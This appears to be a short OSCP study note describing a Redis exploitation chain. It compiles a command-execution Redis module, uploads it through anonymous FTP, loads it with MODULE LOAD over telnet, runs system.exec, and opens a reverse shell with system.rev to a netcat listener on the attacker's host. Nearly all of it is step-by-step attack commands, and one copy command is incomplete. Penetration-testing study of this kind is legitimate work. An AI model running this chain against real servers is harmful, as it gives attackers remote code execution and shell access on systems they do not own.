This is for everything I've found so far while studying for the OSCP. 

This module.so is a compiled file from this repo:
https://github.com/n0b0dyCN/RedisModules-ExecuteCommand

The commands for this:
```
git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
cd  RedisModules-ExecuteCommand
```
Then download the module file instead and place it here:
```
cp ./src/module.so
```
Then upload to ftp server:
```
ftp $target
anonymous:anonymous
passive
cd pub
put module.so
bye
```

Then with telnet:
```
telnet $target 6379
MODULE LOAD /var/ftp/pub/module.so

system.exec "id"
```

Create a listener and look for a shell:
You
```
nc -lvnp 6379
```
target:
```
system.rev kali 6379
```
That's for this module.so attack. 
